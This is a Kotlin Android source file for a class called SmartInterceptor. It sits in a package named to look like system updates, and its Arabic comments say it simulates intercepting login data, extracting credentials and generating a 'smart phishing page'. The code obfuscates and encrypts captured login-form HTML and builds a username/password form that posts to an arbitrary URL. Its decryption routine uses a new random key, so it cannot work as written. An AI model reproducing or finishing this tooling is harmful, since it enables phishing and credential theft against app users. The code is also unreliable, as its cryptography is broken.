package com.system.updates.modules

import android.content.Context
import android.util.Base64
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SmartInterceptor {
    private val r = SecureRandom()
    private val p = byteArrayOf(0x5A, 0x6B, 0x7C, 0x8D, 0x9E, 0xAF.toByte(), 0xB0.toByte(), 0xC1.toByte())

    private fun xor(b: ByteArray, key: ByteArray): ByteArray {
        return b.mapIndexed { i, v -> (v.toInt() xor key[i % key.size].toInt()).toByte() }.toByteArray()
    }

    private fun aesEncrypt(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    private fun aesDecrypt(enc: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = enc.sliceArray(0..11)
        val ct = enc.sliceArray(12 until enc.size)
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.DECRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return c.doFinal(ct)
    }

    // يحاكي اعتراض بيانات تسجيل الدخول
    fun interceptLogin(ctx: Context, htmlForm: String): String {
        val raw = htmlForm.toByteArray()
        val key = ByteArray(32).also { r.nextBytes(it) }
        val xored = xor(raw, p)
        val enc = aesEncrypt(xored, key)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }

    // يحاكي استخراج البيانات من الاعتراض
    fun extractCredentials(ctx: Context, intercepted: String): String {
        val enc = Base64.decode(intercepted, Base64.NO_WRAP)
        val key = ByteArray(32).also { r.nextBytes(it) } // في الواقع يجب استرداد المفتاح بطريقة آمنة
        val dec = aesDecrypt(enc, key)
        val deXor = xor(dec, p)
        return String(deXor)
    }

    // يحاكي إنشاء صفحة تصيد ذكية
    fun generatePhishingPage(ctx: Context, targetUrl: String): String {
        val template = "<html><body><form method='POST' action='$targetUrl'>" +
                "<input name='username'/><input name='password' type='password'/>" +
                "<input type='submit'/></form></body></html>"
        return Base64.encodeToString(template.toByteArray(), Base64.NO_WRAP)
    }
}